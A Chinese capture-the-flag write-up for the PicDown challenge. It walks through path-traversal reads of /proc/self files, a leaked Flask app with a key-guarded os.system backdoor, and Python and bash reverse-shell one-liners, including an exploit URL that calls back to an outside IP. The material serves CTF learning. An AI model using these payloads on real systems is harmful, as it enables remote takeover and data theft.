# [网鼎杯 2020 白虎组]PicDown python反弹shell proc/self目录的信息

[[网鼎杯 2020 白虎组]PicDown - 知乎](https://zhuanlan.zhihu.com/p/427888190) 

这里确实完全不会 第一次遇到一个只有文件读取思路的题目

这里也确实说明还是要学学一些其他的东西了

首先打开环境



<img src="https://i-blog.csdnimg.cn/blog_migrate/a03714c6085d8f4fb6c3045ce8bc4c36.png" alt="" style="max-height:192px; box-sizing:content-box;" />


只存在一个框框 我们通过目录扫描抓包 注入 发现没有用

我们测试能不能任意文件读取



```cobol
?url=../../../../etc/passwd
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/aea4fa2b7addf50d1b3ab998a723f445.png" alt="" style="max-height:554px; box-sizing:content-box;" />
发现读取成功

其次我到这里就没有思路了

我们首先学东西吧

当遇到文件读取我们可以读取什么

## linux 文件读取

 [Linux的/proc/self/学习_lmonstergg的博客-CSDN博客](https://blog.csdn.net/cjdgg/article/details/119860355) 

我们可以打开我们的linux看看

除了我们最常见的 etc/passwd

其实还存在着两个文件 可以读取

### environ

```cobol
proc/self/environ
```

```php
environ文件存储着当前进程的环境变量列表，彼此间用空字符（NULL）隔开，变量用大写字母表示，其值用小写字母表示。可以通过查看environ目录来获取指定进程的环境变量信息：
```

还是很敏感的 有的题目就喜欢出在环境变量里

第二个



<img src="https://i-blog.csdnimg.cn/blog_migrate/2431cb85650593bda29a0452d38ec812.png" alt="" style="max-height:270px; box-sizing:content-box;" />


### cmdline

我们可以通过这个知道使用者在做什么

所以这道题 我们可以继续来读取



<img src="https://i-blog.csdnimg.cn/blog_migrate/1f366280b4ce89860d485c512895de14.png" alt="" style="max-height:294px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/53320b8312acc41027a162acad980936.png" alt="" style="max-height:365px; box-sizing:content-box;" />


cmdline中出现了 app.py 内容

我们需要读取

但是内容在哪里呢。。。。

这个只能猜测了

但是我们知道 当前工作环境多半就是app.py

所以其实在 proc里面 也同样存在着当前工作环境的文件

这个是一个方法

### cwd

```cobol
proc/self/cwd/app.py
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/f635cbe5e6c75af10516498f2809873e.png" alt="" style="max-height:376px; box-sizing:content-box;" />


第二种 猜测main.py

我们猜测当前环境的文件名有main.py

失败

第三种

app.py 我们猜测在 app文件夹中

失败

但是通过上面的cwd我们可以获取代码了

现在开始代码审计

```cobol
from flask import Flask, Response
from flask import render_template
from flask import request
import os
import urllib
 
app = Flask(__name__)
 
SECRET_FILE = "/tmp/secret.txt"
f = open(SECRET_FILE)
SECRET_KEY = f.read().strip()
os.remove(SECRET_FILE)
 
 
@app.route('/')
def index():
    return render_template('search.html')
 
 
@app.route('/page')
def page():
    url = request.args.get("url")
    try:
        if not url.lower().startswith("file"):
            res = urllib.urlopen(url)
            value = res.read()
            response = Response(value, mimetype='application/octet-stream')
            response.headers['Content-Disposition'] = 'attachment; filename=beautiful.jpg'
            return response
        else:
            value = "HACK ERROR!"
    except:
        value = "SOMETHING WRONG!"
    return render_template('search.html', res=value)
 
 
@app.route('/no_one_know_the_manager')
def manager():
    key = request.args.get("key")
    print(SECRET_KEY)
    if key == SECRET_KEY:
        shell = request.args.get("shell")
        os.system(shell)
        res = "ok"
    else:
        res = "Wrong Key!"
 
    return res
 
 
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

我们在读取代码后发现

```cobol
@app.route('/no_one_know_the_manager')
def manager():
    key = request.args.get("key")
    print(SECRET_KEY)
    if key == SECRET_KEY:
        shell = request.args.get("shell")
        os.system(shell)
        res = "ok"
    else:
        res = "Wrong Key!"
 
    return res
```

这里是重要的内容

首先要获取 secet_/tmp/secret.txtkey

我们去看看/tmp/secret.txt



<img src="https://i-blog.csdnimg.cn/blog_migrate/7ca7f77ceadae8ab7d2e57298cf056d5.png" alt="" style="max-height:423px; box-sizing:content-box;" />


没有啊

但是这里我们需要学习一个内容

## open在linux

这里上面文件可能是被删除或其他

但是我们需要看到一个代码

```cobol
f = open(SECRET_FILE)
```

这里很显然是通过 open函数打开 那么在linux中会创建文件标识符

## 文件标识符

```undefined
文件标识符是一个非负整数
 
其实是一个索引值
 
当程序打开或创建 一个进程的时候
 
内核会创建一个标识符
```

这个标识符 会存储在 proc/self/fd/数字

这个文件中

所以我们通过bp爆破来获取



<img src="https://i-blog.csdnimg.cn/blog_migrate/c2a6763e84ffec109693260e1e839c38.png" alt="" style="max-height:703px; box-sizing:content-box;" />


在第三个中 我们获取到了值 我们通过base解密一下



<img src="https://i-blog.csdnimg.cn/blog_migrate/a7fa2d146e6883ebe6705a3532806901.png" alt="" style="max-height:517px; box-sizing:content-box;" />


发现不是 那么就是明文了

所以我们获取了key的值

```cobol
zBsgJNHfXv01kvfGS0c0B9UxLVTYcpCK73NVovFs/cE=
```

下面我们通过反弹shell来执行

正好学习一下什么是反弹shell吧

## python反弹shell

### 含义

```scss
反弹shell的含义
 
正向 就是 攻击者通过(ssh,远程桌面等) 链接用户客户端
 
反向 就是 用户客户端作为主动链接方 主动链接攻击方
```

主要的目的是什么呢

### 目的

```undefined
对方服务器存在防火 只能发送 不允许接受
 
ip发生变化
 
攻击者需要在自己的 bash 终端上执行命令
```

那这种反弹shell的原理是什么呢

### 原理

```cobol
让受害方 主动链接 攻击者主机
 
攻击者开放 19111端口TCP服务
 
受害者链接 19111端口
 
 
攻击者 受害者 建立 TCP链接
 
攻击者通过 TCP 发送命令 给受害者执行
 
受害者将执行后的命令返回
```

我们来模拟实验一下

首先确定攻击和受害的ip

```cobol
这里我使用我的ubuntu 和kali
 
kali的ip为  192.168.48.130
 
 
centos的ip为  192.168.48.132
```

我们首先

设置centos防火墙

```cobol
setenforce 0   //设置SELinux 成为permissive模式 临时关闭selinux的 
service iptables status  //查看防火墙状态
```

然后kali通过nc监听

centos通过 反弹shell

```cobol
//kali使用nc进行对本机的4444端口进行监听：
nc -lvvp 4444
//目标主机执行下面python命令：
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.48.130",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/196f09be12a1482abb187a4f56a50057.png" alt="" style="max-height:173px; box-sizing:content-box;" />


发现成功获取了 终端控制



<img src="https://i-blog.csdnimg.cn/blog_migrate/27e5b85abb756adc3a3dab0171d66595.png" alt="" style="max-height:255px; box-sizing:content-box;" />


## bash反弹shell

同样我们先要获取bash

centos中



<img src="https://i-blog.csdnimg.cn/blog_migrate/fd49221355ca10944a9cb4a20786b859.png" alt="" style="max-height:131px; box-sizing:content-box;" />


```cobol
nc -lvvp 4444  #kali
bash -i >& /dev/tcp/192.168.48.130/4444 0>&1   #centos
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/64d2b4f278f2bc53ec89ea115f2105bc.png" alt="" style="max-height:117px; box-sizing:content-box;" />


成功获取

这里我们回到做题

kali中开始监听 然后通过python执行反弹shell命令即可

```cobol
/no_one_know_the_manager?key=zBsgJNHfXv01kvfGS0c0B9UxLVTYcpCK73NVovFs/cE=&shell=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("112.74.89.58",41871));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

然后通过url编码传递



<img src="https://i-blog.csdnimg.cn/blog_migrate/9c81638b9f9dc08288d29ed31b53d21e.png" alt="" style="max-height:148px; box-sizing:content-box;" />


上面我写详细一点

 [NATAPP -](https://natapp.cn/member/invitation) 通过这个网站可以购买到 临时域名

免费的注册一下就行了



<img src="https://i-blog.csdnimg.cn/blog_migrate/8c9864b69a1d1b9e93afc781be2d4174.png" alt="" style="max-height:689px; box-sizing:content-box;" />


通过里面的软件

我们下载



<img src="https://i-blog.csdnimg.cn/blog_migrate/f05ec2da3226f010a4027ed271924b0c.png" alt="" style="max-height:95px; box-sizing:content-box;" />


然后通过命令行

```sql
natapp.exe --authtoken=
```

后面跟上 自己的就可以了



<img src="https://i-blog.csdnimg.cn/blog_migrate/9dcde1820bb0599a9363de015c73450c.png" alt="" style="max-height:296px; box-sizing:content-box;" />


这里会出现端口和域名 我们去ping一下域名 获得ip即可

然后构造即可

## 非预期

这里还有非预期 直接通过 page?url=/flag

直接输出flag。。。。